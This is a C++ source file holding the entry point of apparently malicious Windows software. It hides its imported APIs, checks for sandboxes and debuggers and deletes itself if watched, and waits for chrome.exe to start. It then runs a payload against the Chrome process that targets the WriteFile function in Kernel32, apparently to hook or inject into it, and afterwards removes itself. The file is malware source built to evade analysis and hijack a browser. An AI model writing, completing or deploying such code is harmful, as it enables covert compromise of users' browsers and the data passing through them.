
#include "Windows.h"
#include "API/headers/api.h"
#include "utils/headers/antianalysis.h"
#include "../headers/payload.h"
#include "utils/headers/Tools.h"

#define WIN32_LEAN_AND_MEAN
#define TARGET_FUNC	"WriteFile"
#define TARGET_DLL	"Kernel32"


// Get rid of weird crt call because of float
#ifdef __cplusplus
extern "C" {
#endif
	int _fltused = 0;
#ifdef __cplusplus
}
#endif

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	AntiAnalysis hide;
	Tools		 tools;

	auto& resolver = API::APIResolver::GetInstance();

	resolver.IATCamo();
	resolver.LoadModules();
	resolver.ResolveFunctions();

	auto api	  = resolver.GetAPIAccess();
	
	//hide.DelayExecution(5, resolver); // wait 5 minutes before execution

	
	DWORD process = 0; 

	do
	{
		hide.IsBeingWatched(resolver); // Nuke self if in sandbox or debugger
		process = tools.GetPID("chrome.exe"); // Check if chrome is running

		if (process != 0)
		{
			hide.DelayExecution(0.05, resolver);
			break;
		}

		hide.DelayExecution(0.1, resolver); // This should be every couple of minutes
	} while (process == 0);

	Payload(process, api, TARGET_DLL, TARGET_FUNC);
	
	hide.Nuke(resolver);
	return 0;
} 


